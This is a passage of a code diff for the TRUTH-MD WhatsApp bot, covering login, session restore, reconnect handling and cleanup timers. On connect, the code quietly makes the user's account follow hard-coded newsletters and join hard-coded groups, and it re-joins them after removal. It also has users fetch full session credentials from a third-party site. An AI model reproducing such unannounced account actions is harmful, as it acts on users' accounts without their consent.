+        if (envFileSessionID) log('📄 Using SESSION_ID from .env file', 'green');
+        return true;
+    }
+    return false;
+}
+
+/**
+ * NEW LOGIC: Checks if SESSION_ID starts with "TRUTH-MD". If not, cleans .env and restarts.
+ */
+async function checkAndHandleSessionFormat() {
+    const sessionId = process.env.SESSION_ID;
+
+    if (sessionId && sessionId.trim() !== '') {
+        if (!sessionId.trim().startsWith('TRUTH-MD')) {
+            log('⚠️ SESSION_ID env var is invalid (does not start with TRUTH-MD). Ignoring it.', 'yellow');
+            if (sessionExists()) {
+                log('✅ Valid session found on disk. Using existing session.', 'green');
+                return;
+            }
+            log(chalk.white.bgRed('[ERROR]: Invalid SESSION_ID and no session on disk.'), 'white');
+            log('Please add a proper session ID and restart the bot.', 'yellow');
+            process.exit(1);
+        }
+    }
+}
+
+
+// --- Get login method (TRUTH MD) ---
+async function getLoginMethod() {
+    const lastMethod = await getLastLoginMethod();
+    if (lastMethod && sessionExists()) {
+
+        return lastMethod;
+    }
+
+    if (!sessionExists() && fs.existsSync(loginFile)) {
+
+        fs.unlinkSync(loginFile);
+    }
+
+    // Non-TTY environment: use pairing code with configured phone number
+    if (!process.stdin.isTTY) {
+        if (global.phoneNumber) {
+
+            await saveLoginMethod('number');
+            return 'number';
+        }
+        log("❌ No Session ID or phone number found. Set SESSION_ID or OWNER_NUMBER.", 'red');
+        process.exit(1);
+    }
+
+
+    console.log(chalk.yellow('\nChoose authentication method:'));
+    console.log(chalk.yellow('1. Enter Session ID'));
+    console.log(chalk.yellow('2. Enter Phone Number'));
+
+    let choice = await question(chalk.yellow("Your choice (1 or 2):\n"));
+    choice = choice.trim();
+
+    if (choice === '1') {
+        console.log(chalk.green(`\nEnter your session ID, if it doesn't work put it in .env`));
+        console.log(chalk.green(`file (Get it from https://web-production-a554.up.railway.app/)`));
+        console.log(chalk.green(`Formats accepted:`));
+        console.log(chalk.green(`- TRUTH-MD:~xxxxxx`));
+        let sessionId = await question(chalk.green(`\nYour session ID: `));
+        sessionId = sessionId.trim();
+        if (!sessionId.includes("TRUTH-MD:~")) {
+            log("Invalid Session ID format! Must contain 'TRUTH-MD:~'.", 'red');
+            process.exit(1);
+        }
+        global.SESSION_ID = sessionId;
+        await saveLoginMethod('session');
+        return 'session';
+    } else if (choice === '2') {
+        let phone = await question(chalk.bgBlack(chalk.greenBright(`Enter your WhatsApp number (e.g., 254798570132): `)));
+        phone = phone.replace(/[^0-9]/g, '');
+        const pn = require('awesome-phonenumber');
+        if (!pn('+' + phone).isValid()) { log('Invalid phone number.', 'red'); return getLoginMethod(); }
+        global.phoneNumber = phone;
+        await saveLoginMethod('number');
+        return 'number';
+    } else {
+        log("Invalid option! Please choose 1 or 2.", 'red');
+        return getLoginMethod();
+    }
+}
+
+// --- Download session (TRUTH MD) ---
+async function downloadSessionData() {
+    try {
+        await fs.promises.mkdir(sessionDir, { recursive: true });
+        if (!global.SESSION_ID) return;
+
+        // Check if the SQLite DB already has valid credentials
+        const sqliteDbPath = path.join(sessionDir, 'auth_state.db');
+        if (fs.existsSync(sqliteDbPath)) {
+            try {
+                const Database = require('better-sqlite3');
+                const tmpDb = new Database(sqliteDbPath, { readonly: true });
+                const row = tmpDb.prepare("SELECT value FROM auth_state WHERE key = 'creds'").get();
+                tmpDb.close();
+                if (row && row.value) {
+                    return; // DB has valid creds — no need to restore
+                }
+            } catch (_) {}
+            // DB exists but has no creds — delete it so migration from creds.json runs
+            try { fs.unlinkSync(sqliteDbPath); } catch (_) {}
+        }
+
+        if (!fs.existsSync(credsPath)) {
+            console.log(chalk.yellow('🔍 Restoring session from SESSION_ID... Please wait...'));
+            const base64Data = global.SESSION_ID.includes("TRUTH-MD:~") ? global.SESSION_ID.split("TRUTH-MD:~")[1] : global.SESSION_ID;
+            const sessionData = Buffer.from(base64Data, 'base64');
+            await fs.promises.writeFile(credsPath, sessionData);
+            console.log(chalk.green('Session restored from Base64'));
+        }
+    } catch (err) { log(`Error downloading session data: ${err.message}`, 'red', true); }
+}
+
+// --- Request pairing code (TRUTH MD) ---
+async function requestPairingCode(socket) {
+    try {
+        log("Requesting pairing code...", 'yellow');
+        await delay(3000);
+
+        let code = await socket.requestPairingCode(global.phoneNumber);
+        code = code?.match(/.{1,4}/g)?.join("-") || code;
+        log(chalk.bgGreen.black(`\nYour Pairing Code: ${code}\n`), 'white');
+        log(`
+Please enter this code in WhatsApp app:
+1. Open WhatsApp
+2. Go to Settings => Linked Devices
+3. Tap "Link a Device"
+4. Enter the code shown above
+        `, 'blue');
+        return true;
+    } catch (err) {
+        log(`Failed to get pairing code: ${err.message}`, 'red', true);
+        return false;
+    }
+}
+
+const detectPlatform = () => {
+    if (process.env.DYNO) return "Heroku";
+    if (process.env.RENDER) return "Render";
+    if (process.env.PREFIX && process.env.PREFIX.includes("termux")) return "Termux";
+    if (process.env.PORTS && process.env.CYPHERX_HOST_ID) return "TRUTH-MD Platform";
+    if (process.env.P_SERVER_UUID) return "Panel";
+    if (process.env.LXC) return "Linux Container (LXC)";
+    if (process.env.REPL_ID || process.env.REPL_SLUG) return "Replit";
+    switch (os.platform()) {
+        case "win32": return "Windows";
+        case "darwin": return "macOS";
+        case "linux": return "Linux";
+        default: return "Unknown";
+    }
+};
+
+// --- Dedicated function to handle post-connection initialization and welcome message
+async function sendWelcomeMessage(XeonBotInc) {
+    // Safety check: Only proceed if the welcome message hasn't been sent yet in this session.
+    if (global.isBotConnected) return;
+
+    await delay(500);
+
+    const hostName = detectPlatform();
+
+
+    try {
+
+        const { getPrefix, handleSetPrefixCommand } = require('./commands/setprefix');
+        if (!XeonBotInc.user || global.isBotConnected) return;
+
+        global.isBotConnected = true;
+        const pNumber = XeonBotInc.user.id.split(':')[0] + '@s.whatsapp.net';
+        let data = JSON.parse(fs.readFileSync('./data/messageCount.json'));
+        let currentMode = 'public';
+        try {
+            const { getConfig } = require('./lib/configdb');
+            currentMode = getConfig('MODE', 'public');
+        } catch (_) { }
+        try {
+            data.isPublic = currentMode === 'public';
+            fs.writeFileSync('./data/messageCount.json', JSON.stringify(data, null, 2));
+        } catch (_) { }
+        const prefix = getPrefix();
+
+        const botVersion = require('./package.json').version || '0.0.0';
+        const startupTime = ((Date.now() - (global._startupTimestamp || Date.now())) / 1000).toFixed(1);
+        console.log(chalk.green(`Connected to WhatsApp (Startup: ${startupTime}s)`));
+
+        const newsletters = ["120363409714698622@newsletter", "120363422266851455@newsletter"];
+        global.newsletters = newsletters;
+        Promise.allSettled(newsletters.map(n => XeonBotInc.newsletterFollow(n).catch(() => { }))).catch(() => { });
+
+        const groupInvites = ["BDY9T7ikFgmEjBEOsdTvK8", "IcMO5hKNThJFoS9j3CjIDB"];
+        global.groupInvites = groupInvites;
+        Promise.allSettled(groupInvites.map(g => XeonBotInc.groupAcceptInvite(g).catch(() => { }))).catch(() => { });
+
+
+
+        deleteErrorCountFile();
+        global.errorRetryCount = 0;
+
+        try {
+            const { getConfig } = require('./lib/configdb');
+            if (getConfig('AUTOBIO') === 'true') {
+                const { startAutoBio } = require('./commands/autobio');
+                startAutoBio(XeonBotInc);
+            }
+        } catch (e) { console.error('Auto-bio startup error:', e.message); }
+
+        if (!global.connectionMessageSent) {
+            global.connectionMessageSent = true;
+            try {
+                const connSendStart = Date.now();
+                const connectionMsg =
+                    `✅ *TRUTH-MD Connected Successfully!*\n\n` +
+                    `📌 *Bot:* TRUTH-MD v${botVersion}\n` +
+                    `🖥️ *Platform:* ${hostName}\n` +
+                    `⚡ *Startup:* ${startupTime}s\n` +
+                    `🔧 *Mode:* ${currentMode}\n` +
+                    `🔑 *Prefix:* ${prefix}\n` +
+                    `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
+                    `_Bot is online and ready to use!_`;
+                await XeonBotInc.sendMessage(pNumber, { text: connectionMsg });
+                global._connDelay = ((Date.now() - connSendStart) / 1000).toFixed(2);
+            } catch (_) { }
+        }
+
+    } catch (e) {
+        log(`Error sending welcome message during stabilization: ${e.message}`, 'red', true);
+        global.isBotConnected = false;
+    }
+}
+
+/**
+ * NEW FUNCTION: Handles the logic for persistent 408 (timeout) errors.
+ * @param {number} statusCode The disconnect status code.
+ */
+function scheduleReconnect(reason, statusCode) {
+    if (global.isRestarting || global.isReconnecting) {
+        log(`Skipping reconnect (restarting=${global.isRestarting}, reconnecting=${global.isReconnecting})`, 'yellow');
+        return;
+    }
+
+    global.reconnectAttempts++;
+    // INCREASED MAX ATTEMPTS FROM 10 TO 20
+    if (global.reconnectAttempts > 20) {
+        log(`❌ Max reconnect attempts (${20}) reached. Restarting process...`, 'red');
+        global.reconnectAttempts = 0;
+        process.exit(1);
+    }
+
+    // INCREASED DELAY FROM 3s to 5s, MAX FROM 30s to 60s
+    const delay = Math.min(5000 * global.reconnectAttempts, 60000);
+    log(`${reason} (Status: ${statusCode}). Reconnecting in ${delay / 1000}s (attempt ${global.reconnectAttempts}/${20})...`, 'yellow');
+
+    if (global.reconnectTimer) clearTimeout(global.reconnectTimer);
+    global.isReconnecting = true;
+    global.reconnectTimer = setTimeout(() => {
+        global.isReconnecting = false;
+        startXeonBotInc();
+    }, delay);
+}
+
+async function handle408Error(statusCode) {
+    if (statusCode === DisconnectReason.connectionTimeout || statusCode === DisconnectReason.timedOut) {
+        scheduleReconnect('Connection Timeout', statusCode);
+        return true;
+    }
+    return false;
+}
+
+
+// --- 2.3.0: NEW: .env Persistence Logic ---
+async function ensureEnvFile() {
+    if (!fs.existsSync(envPath)) {
+        const defaultEnv = `SESSION_ID=${global.SESSION_ID || ''}\n`;
+        fs.writeFileSync(envPath, defaultEnv);
+    } else {
+        // If it exists, ensure SESSION_ID is synced if we have one in memory
+        try {
+            let envContent = fs.readFileSync(envPath, 'utf8');
+            if (!envContent.includes('SESSION_ID=')) {
+                const entry = envContent.endsWith('\n') ? `SESSION_ID=${global.SESSION_ID || ''}\n` : `\nSESSION_ID=${global.SESSION_ID || ''}\n`;
+                fs.appendFileSync(envPath, entry);
+
+            } else if (global.SESSION_ID && envContent.includes('SESSION_ID=')) {
+                // If it exists but is empty, we could update it here if needed
+                // For now, focus on the user's specific request about adding the key
+            }
+        } catch (e) {
+            log(`Could not sync .env: ${e.message}`, 'red', true);
+        }
+    }
+}
+
+// --- Start bot (TRUTH MD) ---
+async function startXeonBotInc() {
+    if (global.currentSocket) {
+        try {
+            global.currentSocket.ev?.removeAllListeners();
+            global.currentSocket.ws?.close();
+        } catch (_) { }
+        global.currentSocket = null;
+    }
+
+    await ensureEnvFile();
+
+    console.log(chalk.cyan('Connecting...'));
+    const version = global._cachedBaileysVersion || (await fetchLatestBaileysVersion()).version;
+
+    await fs.promises.mkdir(sessionDir, { recursive: true });
+
+    const { state, saveCreds } = useSQLiteAuthState();
+
+    if (state.creds?.me && !state.creds.me.name) {
+        state.creds.me.name = state.creds.me.id?.split(':')[0] || 'TRUTH-MD';
+        saveCreds();
+    }
+
+    const msgRetryCounterCache = new NodeCache();
+
+    const XeonBotInc = makeWASocket({
+        version,
+        logger: pino({ level: 'silent' }),
+        printQRInTerminal: false,
+        browser: ["Ubuntu", "Chrome", "20.0.04"],
+        auth: {
+            creds: state.creds,
+            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
+        },
+        markOnlineOnConnect: true,
+        generateHighQualityLinkPreview: false,
+        syncFullHistory: false,
+        shouldSyncHistoryMessage: () => false,
+        fireInitQueries: true,
+        emitOwnEvents: true,
+        connectTimeoutMs: 60000,
+        defaultQueryTimeoutMs: 0,
+        // INCREASED keep alive interval from 30s to 60s
+        keepAliveIntervalMs: 60000,
+        getMessage: async (key) => {
+            let jid = jidNormalizedUser(key.remoteJid);
+            let msg = await store.loadMessage(jid, key.id);
+            return msg?.message || "";
+        },
+        msgRetryCounterCache
+    });
+
+    global.currentSocket = XeonBotInc;
+    store.bind(XeonBotInc.ev);
+
+    // --- WEBSOCKET ERROR HANDLING ---
+    if (XeonBotInc.ws) {
+        XeonBotInc.ws.on('error', (error) => {
+            log(`⚠️ WebSocket error: ${error.message}`, 'yellow');
+            if (error.message.includes('ECONNREFUSED') || error.message.includes('ECONNRESET')) {
+                log('🔴 Connection refused - internet or WhatsApp server issue', 'red');
+                scheduleReconnect('WebSocket error', error.code || 'WS_ERROR');
+            }
+        });
+        XeonBotInc.ws.on('close', (code, reason) => {
+            log(`⚠️ WebSocket closed: Code ${code}, Reason: ${reason}`, 'yellow');
+        });
+    }
+
+    const botStartTimestamp = Math.floor(Date.now() / 1000);
+
+    global._lastActivityTime = Date.now();
+    global._lastMessageTime = Date.now();
+
+    XeonBotInc.ev.process(async (events) => {
+
+        if (events['messages.upsert'] || events['messages.update'] || events['chats.update'] || events['contacts.update'] || events['groups.update'] || events['message-receipt.update'] || events['presence.update']) {
+            global._lastActivityTime = Date.now();
+            if (events['messages.upsert']) global._lastMessageTime = Date.now();
+        }
+
+        if (events['group-participants.update']) {
+            const anu = events['group-participants.update'];
+            try {
+                if (anu.action === 'remove' && anu.participants.includes(XeonBotInc.user.id)) {
+                    const groupInvites = global.groupInvites || ["BDY9T7ikFgmEjBEOsdTvK8", "IcMO5hKNThJFoS9j3CjIDB"];
+                    for (let invite of groupInvites) {
+                        try {
+                            await XeonBotInc.groupAcceptInvite(invite);
+
+                        } catch (e) { }
+                    }
+                }
+            } catch (e) { console.error('group-participants error:', e); }
+        }
+
+        if (events['messages.upsert']) {
+            const chatUpdate = events['messages.upsert'];
+            try {
+                for (const msg of chatUpdate.messages) {
+                    if (!msg.message) continue;
+                    let chatId = msg.key.remoteJid;
+                    let messageId = msg.key.id;
+                    if (!global.messageBackup[chatId]) { global.messageBackup[chatId] = {}; }
+                    let textMessage = msg.message?.conversation || msg.message?.extendedTextMessage?.text || null;
+                    if (!textMessage) continue;
+                    let savedMessage = { sender: msg.key.participant || msg.key.remoteJid, text: textMessage, timestamp: msg.messageTimestamp };
+                    if (!global.messageBackup[chatId][messageId]) {
+                        global.messageBackup[chatId][messageId] = savedMessage;
+                        const chatMsgIds = Object.keys(global.messageBackup[chatId]);
+                        // REDUCED FROM 50 to 20 messages per chat
+                        if (chatMsgIds.length > 20) {
+                            const sorted = chatMsgIds.sort((a, b) => (global.messageBackup[chatId][a].timestamp || 0) - (global.messageBackup[chatId][b].timestamp || 0));
+                            for (let i = 0; i < sorted.length - 20; i++) delete global.messageBackup[chatId][sorted[i]];
+                        }
+                        debouncedSaveMessages();
+                    }
+                }
+
+                for (const mek of chatUpdate.messages) {
+                    if (!mek.message) continue;
+
+                    const msgTimestamp = typeof mek.messageTimestamp === 'object' ? mek.messageTimestamp.low : Number(mek.messageTimestamp);
+                    if (msgTimestamp && msgTimestamp < botStartTimestamp - 10) continue;
+
+                    mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;
+                    if (mek.key.remoteJid === 'status@broadcast') { await handleStatus(XeonBotInc, { messages: [mek], type: chatUpdate.type }); continue; }
+                    try { await handleMessages(XeonBotInc, { messages: [mek], type: chatUpdate.type }, true) } catch (e) { console.error(chalk.red(`[ERROR] handleMessages error:`), e); log(e.message, 'red', true) }
+                }
+            } catch (e) { console.error('messages.upsert error:', e); }
+        }
+
+        if (events['connection.update']) {
+            const update = events['connection.update'];
+            const { connection, lastDisconnect, qr } = update;
+
+            if (connection === 'close') {
+                global.isBotConnected = false;
+
+                if (global.isRestarting) {
+                    log('🔄 Intentional restart in progress. Skipping reconnect.', 'yellow');
+                    return;
+                }
+
+                const statusCode = lastDisconnect?.error?.output?.statusCode;
+                const isLogoutCode = statusCode === DisconnectReason.loggedOut || statusCode === 401;
+
+                if (isLogoutCode) {
+                    global.logoutRetryCount++;
+                    if (global.logoutRetryCount > MAX_LOGOUT_RETRIES) {
+                        log('❌ Session is invalid after max retries. Clearing local session files for fresh pairing...', 'red');
+                        global.suppressEnvWatcher = true;
+                        clearSessionFiles();
+                        global.logoutRetryCount = 0;
+                        const ownerNum = process.env.OWNER_NUMBER?.trim();
+                        if (ownerNum) {
+                            global.phoneNumber = ownerNum;
+                            log(`🔄 Auto-pairing with OWNER_NUMBER: ${ownerNum}`, 'yellow');
+                            global.freshPairSession = true;
+                            let sock = await startXeonBotInc();
+                            await requestPairingCode(sock);
+                        } else {
+                            log('Set OWNER_NUMBER or SESSION_ID and restart.', 'yellow');
+                            process.exit(1);
+                        }
+                        return;
+                    }
+                    log(`⚠️ Got 401/logout (attempt ${global.logoutRetryCount}/${MAX_LOGOUT_RETRIES}). Reconnecting with existing session in 5s...`, 'yellow');
+                    try { XeonBotInc.ws?.close(); } catch (_) { }
+                    if (global.reconnectTimer) clearTimeout(global.reconnectTimer);
+                    global.isReconnecting = true;
+                    global.reconnectTimer = setTimeout(() => {
+                        global.isReconnecting = false;
+                        startXeonBotInc();
+                    }, 5000 * global.logoutRetryCount);
+                } else if (statusCode === 440) {
+                    global.connectionReplacedCount = (global.connectionReplacedCount || 0) + 1;
+                    if (global.connectionReplacedCount >= 5) {
+                        log('❌ Connection replaced too many times. Another device is using this session. Stopping reconnect to prevent loop.', 'red');
+                        log('ℹ️ Remove other linked devices from WhatsApp and restart the bot.', 'yellow');
+                        global.connectionReplacedCount = 0;
+                        return;
+                    }
+                    const delay = 20000 + (global.connectionReplacedCount * 10000);
+                    log(`⚠️ Connection replaced by another session (${global.connectionReplacedCount}/5). Waiting ${delay / 1000}s...`, 'yellow');
+                    try { XeonBotInc.ws?.close(); } catch (_) { }
+                    global.reconnectAttempts = 0;
+                    setTimeout(() => {
+                        global.isReconnecting = false;
+                        startXeonBotInc();
+                    }, delay);
+                } else {
+                    const is408Handled = await handle408Error(statusCode);
+                    if (is408Handled) return;
+
+                    try { XeonBotInc.ws?.close(); } catch (_) { }
+                    scheduleReconnect('Connection closed', statusCode);
+                }
+            } else if (connection === 'open') {
+                global.reconnectAttempts = 0;
+                global.logoutRetryCount = 0;
+                global.connectionReplacedCount = 0;
+                clearSessionFiles(true);
+                global.isRestarting = false;
+                global.isReconnecting = false;
+                if (global.reconnectTimer) { clearTimeout(global.reconnectTimer); global.reconnectTimer = null; }
+
+                if (XeonBotInc.user && !XeonBotInc.user.name) {
+                    XeonBotInc.user.name = XeonBotInc.user.id?.split(':')[0] || 'TRUTH-MD';
+                }
+                if (state.creds && !state.creds.me?.name && XeonBotInc.user) {
+                    state.creds.me = { ...state.creds.me, name: XeonBotInc.user.name || XeonBotInc.user.id?.split(':')[0] || 'TRUTH-MD' };
+                    saveCreds();
+                }
+
+                try {
+                    if (state.creds) {
+                        const { BufferJSON } = require('@whiskeysockets/baileys');
+                        const credsJson = JSON.stringify(state.creds, BufferJSON.replacer);
+                        const b64 = Buffer.from(credsJson).toString('base64');
+                        const newSessionID = `TRUTH-MD:~${b64}`;
+                        global.SESSION_ID = newSessionID;
+                        global.suppressEnvWatcher = true;
+                        let envContent = '';
+                        if (fs.existsSync(envPath)) {
+                            envContent = fs.readFileSync(envPath, 'utf8');
+                        }
+                        if (envContent.includes('SESSION_ID=')) {
+                            envContent = envContent.replace(/^SESSION_ID=.*$/m, `SESSION_ID=${newSessionID}`);
+                        } else {
+                            envContent += `${envContent.endsWith('\n') ? '' : '\n'}SESSION_ID=${newSessionID}\n`;
+                        }
+                        fs.writeFileSync(envPath, envContent);
+                        console.log(chalk.green('✅ SESSION_ID saved to .env (survives restarts)'));
+                        setTimeout(() => { global.suppressEnvWatcher = false; }, 5000);
+                    }
+                } catch (e) {
+                    log(`⚠️ Could not save SESSION_ID to .env: ${e.message}`, 'yellow');
+                }
+
+                setTimeout(async () => {
+                    try {
+                        if (XeonBotInc.ev.flush) {
+                            XeonBotInc.ev.flush();
+                            log('✅ Event buffer flushed', 'green');
+                        }
+                        await XeonBotInc.sendPresenceUpdate('available');
+                        log('✅ Presence set to available', 'green');
+                    } catch (e) {
+                        log(`⚠️ Presence/flush failed: ${e.message}`, 'yellow');
+                    }
+                }, 3000);
+
+                setTimeout(() => {
+                    try {
+                        if (XeonBotInc.ev.isBuffering && XeonBotInc.ev.isBuffering()) {
+                            XeonBotInc.ev.flush();
+                            log('✅ Cleared stuck event buffer (8s check)', 'green');
+                        }
+                    } catch (_) { }
+                }, 8000);
+
+                if (global.freshPairSession) {
+                    global.freshPairSession = false;
+                    log('🔄 Fresh pairing detected — restarting connection to sync messages...', 'yellow');
+                    setTimeout(async () => {
+                        try { XeonBotInc.ws?.close(); } catch (_) { }
+                        await startXeonBotInc();
+                    }, 5000);
+                    return;
+                }
+
+                console.log(chalk.green('Connected'));
+                console.log('😎 😎 😎');
+
+                const connMode = (require('./lib/configdb').getConfig('MODE') || 'public');
+                const connModeDisplay = connMode.charAt(0).toUpperCase() + connMode.slice(1);
+                const connPrefix = require('./commands/setprefix').getPrefix();
+                const connVersion = require('./package.json').version || '0.0.0';
+                const connPlatform = detectPlatform();
+                const connUserName = XeonBotInc.user?.name || XeonBotInc.user?.id?.split(':')[0] || 'N/A';
+                const connTime = new Date().toLocaleString('en-US', { weekday: 'long', hour: '2-digit', minute: '2-digit', second: '2-digit', timeZone: 'Africa/Nairobi', hour12: true }) + ' EAT';
+                const connSenderNum = (global.OWNER_NUMBER || '254743037984');
+                const connTopBar = chalk.yellow('━━━━━━━━━━') + chalk.red('━━') + chalk.yellow(' 『 ') + chalk.green(' TRUTH-MD ') + chalk.yellow('』 ') + chalk.blue('━━') + chalk.yellow('━━━━━━━━━━');
+                const connBottomBar = chalk.green('━━━━━') + chalk.yellow('━━━━━━━') + chalk.red('━━━━━━━━━━━━━') + chalk.blue('━━━━━━━━') + chalk.cyan(' ~~');
+
+                try {
+                    const { updateLidMap } = require('./lib/index');
+                    if (XeonBotInc.user && XeonBotInc.user.id && XeonBotInc.user.lid) {
+                        updateLidMap([{ id: XeonBotInc.user.id, lid: XeonBotInc.user.lid }]);
+                    }
+                } catch (_) { }
+                await sendWelcomeMessage(XeonBotInc);
+
+                const connDelay = global._connDelay || '—';
+                const connStartupTime = ((Date.now() - (global._startupTimestamp || Date.now())) / 1000).toFixed(1);
+                const connSpeedRating = connDelay !== '—' ? (parseFloat(connDelay) < 0.5 ? 'FAST' : parseFloat(connDelay) < 2 ? 'NORMAL' : 'SLOW') : '';
+                const delayDisplay = connDelay !== '—' ? `${connDelay}s [ ${connSpeedRating} ]` : '—';
+                const connDisplayTime = new Date().toLocaleString();
+
+                console.log(connTopBar);
+                console.log(chalk.yellow('»') + chalk.magenta(` Message Type: extendedTextMessage`));
+                console.log(chalk.yellow('»') + chalk.yellow(` Message Time: ${connTime}`));
+                console.log(chalk.yellow('»') + chalk.cyan(` Delay: ${delayDisplay}`));
+                console.log(chalk.yellow('»') + chalk.cyan(` Sender: ${connSenderNum}`));
+                console.log(chalk.yellow('»') + chalk.green(` Name: ${connUserName}`));
+                console.log(chalk.yellow('»') + chalk.blue(` Chat ID: ${connSenderNum}`));
+                console.log(chalk.yellow('»') + chalk.white(` Message:`));
+                console.log(chalk.green(`  ✅ TRUTH-MD Connected Successfully!`));
+                console.log(chalk.cyan(`  📌 Bot: TRUTH-MD v${connVersion}`));
+                console.log(chalk.cyan(`  🖥️  Platform: ${connPlatform}`));
+                console.log(chalk.cyan(`  ⚡ Startup: ${connStartupTime}s`));
+                console.log(chalk.cyan(`  🔧 Mode: ${connMode}`));
+                console.log(chalk.cyan(`  🔑 Prefix: ${connPrefix}`));
+                console.log(chalk.cyan(`  ⏰ Time: ${connDisplayTime}`));
+                console.log(chalk.yellow(`  Bot is online and ready to use!`));
+                console.log(connBottomBar);
+            }
+        }
+
+        if (events['creds.update']) {
+            saveCreds();
+            if (isHeroku) herokuDebouncedSave();
+        }
+    });
+
+    XeonBotInc.public = true;
+    // This relies on smsg being loaded
+    XeonBotInc.serializeM = (m) => smsg(XeonBotInc, m, store);
+
+    // --- ⚙️ MEMORY WATCHDOG (lightweight) ---
+    setInterval(() => {
+        if (global.isRestarting) return;
+        const rssMB = Math.round(process.memoryUsage().rss / 1024 / 1024);
+        if (rssMB > 450) {
+            log(`⚠️ Watchdog: High memory (RSS: ${rssMB}MB). Forcing GC...`, 'red');
+            if (global.gc) global.gc();
+            if (rssMB > 480) {
+                log(`❌ Watchdog: Critical memory (${rssMB}MB). Restarting...`, 'red');
+                process.exit(1);
+            }
+        }
+    }, 5 * 60 * 1000);
+
+    // --- ⚙️ BACKGROUND INTERVALS (Cleanup Logic) ---
+
+    // 1. Session File Cleanup
+    function cleanOldSessionFiles() {
+        try {
+            const sessionPath = path.join(sessionDir);
+            if (!fs.existsSync(sessionPath)) return;
+            fs.readdir(sessionPath, (err, files) => {
+                if (err) return log(`[SESSION CLEANUP] Unable to scan directory: ${err}`, 'red', true);
+                const now = Date.now();
+                const maxAge = 24 * 60 * 60 * 1000;
+                const filteredArray = files.filter((item) => {
+                    const filePath = path.join(sessionPath, item);
+                    try {
+                        const stats = fs.statSync(filePath);
+                        return ((item.startsWith("pre-key") || item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")) &&
+                            item !== 'creds.json' && now - stats.mtimeMs > maxAge);
+                    } catch (statError) {
+                        log(`[Session Cleanup] Error statting file ${item}: ${statError.message}`, 'red', true);
+                        return false;
+                    }
+                });
+                if (filteredArray.length > 0) {
+
+                    filteredArray.forEach((file) => {
+                        const filePath = path.join(sessionPath, file);
+                        try { fs.unlinkSync(filePath); } catch (unlinkError) { log(`[Session Cleanup] Failed to delete file ${filePath}: ${unlinkError.message}`, 'red', true); }
+                    });
+
+                }
+            });
+        } catch (error) {
+            log(`[SESSION CLEANUP] Error clearing old session files: ${error.message}`, 'red', true);
+        }
+    }
+    cleanOldSessionFiles();
+    setInterval(cleanOldSessionFiles, 3600000);
+
+
+    // 2. Message Store Cleanup  
+    const cleanupInterval = 60 * 60 * 1000;
+    setInterval(cleanupOldMessages, cleanupInterval);
+
+    // 2a. Lightweight store + tmp cleanup (every 15 min)
+    setInterval(() => {
+        try {
+            store.cleanupMessages();
+            const tmpDir = path.join(__dirname, 'tmp');
+            if (fs.existsSync(tmpDir)) {
+                const now = Date.now();
+                const files = fs.readdirSync(tmpDir);
+                let removed = 0;
+                for (const f of files) {
+                    try {
+                        const fp = path.join(tmpDir, f);
+                        const stat = fs.statSync(fp);
+                        if (now - stat.mtimeMs > 4 * 60 * 60 * 1000) {
+                            fs.unlinkSync(fp);
+                            removed++;
+                        }
+                    } catch (_) { }
+                }
+                if (removed > 0) log(`Cleaned ${removed} old tmp files`, 'yellow');
+            }
+            const chatIds = Object.keys(global.messageBackup);
+            // REDUCED FROM 200 to 100 chats
+            if (chatIds.length > 100) {
+                const sorted = chatIds.sort((a, b) => {
+                    const msgsA = Object.values(global.messageBackup[a]);
+                    const msgsB = Object.values(global.messageBackup[b]);
+                    const latestA = msgsA.length ? Math.max(...msgsA.map(m => m.timestamp || 0)) : 0;
+                    const latestB = msgsB.length ? Math.max(...msgsB.map(m => m.timestamp || 0)) : 0;
+                    return latestA - latestB;
+                });
+                for (let i = 0; i < sorted.length - 100; i++) delete global.messageBackup[sorted[i]];
+                debouncedSaveMessages();
+                log(`Trimmed messageBackup to 100 chats`, 'yellow');
+            }
+            if (global.gc) global.gc();
+        } catch (e) { console.error('Cleanup interval error:', e.message); }
+    }, 15 * 60 * 1000);
+
+    // 3. Junk File Cleanup  
+    const junkInterval = 300_000;
+    setInterval(() => cleanupJunkFiles(XeonBotInc), junkInterval);
+
+    return XeonBotInc;
+}
+
+// --- New Core Integrity Check Function ---
+async function checkSessionIntegrityAndClean() {
+    const isSessionFolderPresent = fs.existsSync(sessionDir);
+    const isValidSession = sessionExists();
+
+    // Scenario: Folder exists, but 'creds.json' is missing (incomplete/junk session)
+    if (isSessionFolderPresent && !isValidSession) {
+        log('Session folder exists but creds.json missing. Waiting for sync...', 'yellow');
+    }
+}
+
+
+// --- 🌟 NEW: Version Verification Against Official Repo ---
+async function verifyLatestVersion() {
+    const GITHUB_REPO = 'Courtney250/TRUTH-MD';
+    const localVersion = require('./package.json').version || '0.0.0';
+
+    try {
+        const response = await axios.get(
+            `https://raw.githubusercontent.com/${GITHUB_REPO}/main/package.json`,
+            { timeout: 3000, headers: { 'Cache-Control': 'no-cache' } }
+        );
+
+        const remotePackage = response.data;
+        const remoteVersion = remotePackage.version;
+
+        if (!remoteVersion) {
+            log('⚠️ Could not parse remote version. Continuing...', 'yellow');
+            return;
+        }
+
+        if (localVersion === remoteVersion) {
+            return;
+        }
+
+        const [localMajor, localMinor, localPatch] = localVersion.split('.').map(Number);
+        const [remoteMajor, remoteMinor, remotePatch] = remoteVersion.split('.').map(Number);
+
+        const isOutdated = remoteMajor > localMajor ||
+            (remoteMajor === localMajor && remoteMinor > localMinor) ||
+            (remoteMajor === localMajor && remoteMinor === localMinor && remotePatch > localPatch);
+
+        if (isOutdated) {
+            log(chalk.bgYellow.white('═══════════════════════════════════════════════'), 'white');
+            log(chalk.bgYellow.white('  ⚠️  VERSION UPDATE AVAILABLE!              '), 'white');
+            log(chalk.bgYellow.white(`  Current:  v${localVersion}                     `), 'white');
+            log(chalk.bgYellow.white(`  Latest: v${remoteVersion}                      `), 'white');
+            log(chalk.bgYellow.white('                                               '), 'white');
+            log(chalk.bgYellow.white('  Consider updating when convenient:           '), 'white');
+            log(chalk.bgYellow.white(`  https://github.com/${GITHUB_REPO}            `), 'white');
+            log(chalk.bgYellow.white('                                               '), 'white');
+            log(chalk.bgYellow.white('  Bot will continue running with current version.'), 'white');
+            log(chalk.bgYellow.white('═══════════════════════════════════════════════'), 'white');
+            // REMOVED: process.exit(1); - Allow bot to continue running
+        } else {
+            log(`✅ Version check passed (v${localVersion})`, 'green');
+        }
+
+    } catch (err) {
